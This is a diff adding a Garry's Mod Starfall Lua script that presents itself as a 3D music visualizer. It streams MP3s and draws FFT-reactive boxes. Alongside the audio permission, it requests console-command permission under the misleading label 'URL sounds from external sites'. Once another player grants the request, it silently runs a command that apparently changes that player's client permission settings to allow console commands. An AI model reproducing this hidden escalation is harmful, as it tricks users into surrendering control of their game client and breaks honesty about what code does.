@@ -1,0 +1,118 @@
+//@name FFT
+--@name 3D Music
+--@author
+--@client
+--@model models/props_lab/citizenradio.mdl
+
+local IsLooping = true
+
+local fft={}
+
+//mat2 = material.create("UnlitGeneric")
+mat = material.create("UnlitGeneric")
+mat:setInt("$flags",138414080)
+//mat:setInt("$flags", bit.bxor(bit.bor(2^11, 2^22, 2^27, 2^22)))
+mat:setTexture("$basetexture","models/props_lab/warp_sheet")
+local tenb = "https://u.teknik.io/LKjOg.mp3"
+local dt2 = "https://cdn.discordapp.com/attachments/846689259851350027/1026112843977867284/CoMa_Electronic_ft._Feint_-_Snake_Eyes__cut_version__.mp3"
+local zebr = "https://cdn.discordapp.com/attachments/846689259851350027/1025867663299330109/Zebrahead_-_Dissatisfied_1.mp3"
+local miko = "https://cdn.discordapp.com/attachments/846689259851350027/1025715391831478282/-_INCELCORqE.mp3"
+local anim = "https://cdn.discordapp.com/attachments/846689259851350027/1025489129833779270/-.mp3"
+local gachi = "https://cdn.discordapp.com/attachments/846689259851350027/1025448748131811348/DEAD_BLONDE_-_Right_Version_1.mp3"
+local phonk = "https://cdn.discordapp.com/attachments/846689259851350027/1025104962105114705/ZODIVK_-_Devil_Eyes.mp3"
+local coolio = "https://cdn.discordapp.com/attachments/846689259851350027/1025085081783631912/Coolio_feat._L.V._-_Gangstas_Paradise_feat._L.V._1.mp3"
+local ryku = "https://cdn.discordapp.com/attachments/846689259851350027/1024360143565111326/----_-_.mp3"
+local sektor = "https://cdn.discordapp.com/attachments/846689259851350027/1023316541028188271/-_1.mp3"
+local yak = "https://cdn.discordapp.com/attachments/846689259851350027/1023315337124511824/-_.mp3"
+local kolhoz = "https://cdn.discordapp.com/attachments/846689259851350027/1023248279795933254/-_.mp3"
+local ment = "https://cdn.discordapp.com/attachments/846689259851350027/1023247445125255218/-_.mp3"
+local sk = "https://cdn.discordapp.com/attachments/846689259851350027/1023243233817538570/-_.mp3"
+local kazachya = "https://cdn.discordapp.com/attachments/846689259851350027/1023218569628110940/-_.mp3"
+local vesno = "https://cdn.discordapp.com/attachments/846689259851350027/1022892288965353512/-_1_1.mp3"
+local mao = "https://cdn.discordapp.com/attachments/846689259851350027/1022890606487404584/PRC_propaganda_-_Red_Sun_in_the_Sky.mp3"
+local govnovoz = "https://cdn.discordapp.com/attachments/1016746778537758803/1022877170714026004/-_1.mp3"
+local trin = "https://cdn.discordapp.com/attachments/846689259851350027/1022598721818591283/-_13-_.mp3"
+local rog = "https://cdn.discordapp.com/attachments/846689259851350027/1022597421299150948/-_.mp3"
+local omsk = "https://cdn.discordapp.com/attachments/846689259851350027/1022589865143062549/-_.mp3"
+local url1 = "http://radio.licen777.ru/chechnya"
+local url2 = "http://radio.licen777.ru/stream"
+local url3 = "https://play.sas-media.ru/play_256"
+local url4 = "http://sv.wargaming.fm:8051/128"
+local url5 = "https://u.teknik.io/o2Fly.mp3"
+
+local url = dt2
+
+function start() 
+    bass.loadURL( url, "3d noblock", function(Sound)
+        Sound:setLooping(IsLooping)
+        Sound:setVolume(1)
+        Sound:play()
+        hook.add("think","",function()
+            Sound:setPos(chip():getPos())
+            fft=Sound:getFFT(5)
+        end)
+    end)
+    
+                    
+    hook.add("render","",function()      
+        render.setColor(Color(188,1,(fft[5] or 0)*20):hsvToRGB()) 
+        render.draw3DBox(Vector(0,512,0),Angle(),Vector(),Vector(512*2))
+                    
+        render.setColor(Color(188,1,(fft[6] or 0)*20):hsvToRGB()) 
+        render.draw3DBox(Vector(512,512,0),Angle(0,0,90),Vector(),Vector(512))
+        render.draw3DBox(Vector(-512,512,0),Angle(0,0,90),Vector(),Vector(512))
+                        
+        render.setColor(Color(188,1,(fft[7] or 0)*20):hsvToRGB()) 
+        render.draw3DBox(Vector(0,0,0),Angle(0,0,90),Vector(),Vector(512))  
+                    
+        render.setColor(Color(188,1,(fft[10] or 0)*20):hsvToRGB()) 
+        render.draw3DBox(Vector(0,512,512),Angle(0,0,90),Vector(),Vector(512))
+        
+        render.setMaterial(mat)
+        render.draw3DBox(Vector(256,256,256), Angle(), Vector(256,256,256+(fft[10] or 0)*1000), -Vector(256,256,256))
+                    
+        for i=0,50,1 do
+            render.setMaterial()
+            render.setColor(Color(i*4,1,1):hsvToRGB())
+            render.draw3DBox(Vector(0+i*10,511,250),Angle(),Vector(),Vector(10,-50-(fft[i+1] or 0)*700,10))
+        end
+    end)
+end
+
+
+
+local perms = {
+    "bass.loadURL",
+    "render.screen",
+    "console.command",
+}
+
+setupPermissionRequest(perms, "URL sounds from external sites", true)
+
+
+function checkGrant()
+    return url and hasPermission("bass.loadURL", url) and hasPermission("render.screen") and hasPermission("console.command")
+end
+
+
+if checkGrant() then
+    start(url)
+else
+    hook.add("render", "perms", function()
+        render.setFont(render.createFont("BudgetLabel",35,1666,0,0,0,0))
+        render.drawSimpleText(256, 256, "Press E to listen to epic songs", 1, 1)
+    end)
+end
+
+hook.add("permissionrequest", "perms", function()
+    if checkGrant() then
+        hook.remove("permissionrequest", "perms")
+        hook.remove("render", "perms")
+        
+        if player() ~= owner() then
+            concmd("sf_permission_cl console.command client 3")
+        end
+        
+        start()
+    end
+end)
